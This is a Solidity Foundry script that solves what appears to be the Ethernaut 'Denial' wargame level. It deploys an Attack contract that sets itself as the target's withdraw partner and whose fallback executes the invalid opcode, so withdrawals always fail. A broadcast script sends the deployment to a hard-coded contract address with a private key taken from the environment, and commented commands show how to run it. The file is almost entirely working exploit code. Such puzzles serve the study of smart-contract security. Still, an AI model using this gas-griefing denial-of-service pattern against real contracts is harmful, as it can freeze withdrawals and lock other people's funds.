// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract Attack {
    Denial denial;

    constructor(Denial _denial) {
        denial = Denial(_denial);
        denial.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()
        }
    }
}

contract DenialHack is Script {
    Denial denial = Denial(payable(0x6ADDF802D9e17cF37FDF81C82481F85d5b3caf4A));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack(denial);

        vm.stopBroadcast();
    }
}

// forge script script/Denial.s.sol -vv --tc DenialHack
// forge script script/Denial.s.sol -vv --broadcast --tc DenialHack
